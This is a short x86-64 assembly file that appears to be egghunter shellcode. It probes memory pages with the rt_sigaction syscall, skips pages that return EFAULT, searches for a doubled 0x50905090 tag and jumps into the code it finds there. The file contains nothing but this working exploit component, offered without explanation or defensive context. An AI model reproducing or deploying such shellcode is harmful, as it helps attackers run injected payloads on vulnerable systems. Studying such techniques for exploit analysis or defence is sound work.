global _start

section .text

_start:

	xor rsi, rsi

switch_page:

	or si, 0xfff

scan_page:

	inc rsi

	xor rax, rax
	add rax, 13
	xor r10, r10
	add r10, 8
	syscall

	cmp al, 0xf2
	jz switch_page

	; half egg
	mov eax, 0x50905090
	mov rdi, rsi
	scasd
	jnz scan_page

	scasd
	jnz scan_page
	jmp rsi
